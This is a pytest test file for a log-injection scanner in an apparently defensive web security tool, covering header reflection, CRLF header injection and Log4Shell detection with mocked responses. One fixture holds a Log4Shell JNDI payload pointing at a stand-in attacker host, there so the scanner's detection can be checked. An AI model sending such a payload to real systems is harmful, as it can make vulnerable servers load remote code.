"""Tests for tblue.scanner.log_injection — log injection / log forging scanner."""

import pytest
from unittest.mock import MagicMock, patch
from tblue.scanner.log_injection import LogInjectionScanner


def _scanner():
    session = MagicMock()
    return LogInjectionScanner(session)


def _resp(status=200, body="", headers=None):
    r = MagicMock()
    r.status_code = status
    r.text = body
    r.headers = headers or {}
    return r


# ── None response → PASS ──────────────────────────────────────────────────────

def test_no_response_pass():
    s = _scanner()
    with patch.object(s.http, "get", return_value=None):
        results = s.scan("https://example.com")
    assert any(r["status"] == "PASS" for r in results)


# ── User-Agent reflected in body → WARN ──────────────────────────────────────

def test_user_agent_reflected_warns():
    s = _scanner()
    clean = _resp(200, "<html></html>")
    # Response that echoes back the User-Agent value
    reflected = _resp(200, "<html>Request from: TblueLogProbe9z8x</html>")

    call_count = [0]
    def get_side_effect(url, headers=None, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            return clean  # Initial response
        if headers and "User-Agent" in headers and "TblueLogProbe" in headers["User-Agent"]:
            return reflected
        return clean

    with patch.object(s.http, "get", side_effect=get_side_effect):
        results = s.scan("https://example.com")
    warns = [r for r in results if r["status"] == "WARN"]
    assert warns
    assert any("user-agent" in r["type"].lower() for r in warns)


# ── X-Forwarded-For reflected in body → WARN ─────────────────────────────────

def test_xff_reflected_warns():
    s = _scanner()
    clean = _resp(200, "<html></html>")
    reflected = _resp(200, "<html>IP: 1.2.3.4, TblueLogProbe9z8x</html>")

    call_count = [0]
    def get_side_effect(url, headers=None, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            return clean
        if headers and "X-Forwarded-For" in headers:
            return reflected
        return clean

    with patch.object(s.http, "get", side_effect=get_side_effect):
        results = s.scan("https://example.com")
    warns = [r for r in results if r["status"] == "WARN"]
    assert warns


# ── CRLF in User-Agent injects response header → FAIL ────────────────────────

def test_crlf_in_ua_injects_header_fails():
    s = _scanner()
    clean = _resp(200, "<html></html>")
    # Response with injected header
    crlf_resp = _resp(200, "", headers={
        "Content-Type": "text/html",
        "X-Log-Injected": "TblueLogProbe9z8x",  # The injected header appeared
    })

    call_count = [0]
    def get_side_effect(url, headers=None, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            return clean
        # CRLF probe - return response with injected header
        if headers and ("User-Agent" in headers or "X-Forwarded-For" in headers):
            return crlf_resp
        return clean

    with patch.object(s.http, "get", side_effect=get_side_effect):
        results = s.scan("https://example.com")
    fails = [r for r in results if r["status"] == "FAIL"]
    assert fails
    assert any("crlf" in r["type"].lower() for r in fails)


# ── Log4Shell JNDI in response → FAIL ────────────────────────────────────────

def test_log4shell_jndi_in_response_fails():
    s = _scanner()
    jndi_body = '<html>Error: ${jndi:ldap://attacker.com/a} not processed</html>'
    with patch.object(s.http, "get", return_value=_resp(200, jndi_body)):
        results = s.scan("https://example.com")
    fails = [r for r in results if r["status"] == "FAIL"]
    assert fails
    assert any("log4shell" in r["type"].lower() or "jndi" in r["type"].lower() for r in fails)


# ── CRLF body reflection → WARN ──────────────────────────────────────────────

def test_crlf_marker_in_body_warns():
    s = _scanner()
    clean = _resp(200, "<html></html>")
    crlf_body_resp = _resp(200, "<html>logged: TblueLogProbe9z8x</html>")

    call_count = [0]
    def get_side_effect(url, headers=None, **kwargs):
        call_count[0] += 1
        if call_count[0] == 1:
            return clean
        if headers and ("User-Agent" in headers or "X-Forwarded-For" in headers):
            return crlf_body_resp
        return clean

    with patch.object(s.http, "get", side_effect=get_side_effect):
        results = s.scan("https://example.com")
    # Should be WARN (body reflection of CRLF payload)
    warns_or_fails = [r for r in results if r["status"] in ("WARN", "FAIL")]
    assert warns_or_fails


# ── Clean response → PASS ─────────────────────────────────────────────────────

def test_clean_response_passes():
    s = _scanner()
    with patch.object(s.http, "get", return_value=_resp(200, "<html>Clean page</html>")):
        results = s.scan("https://example.com")
    passes = [r for r in results if r["status"] == "PASS"]
    assert passes
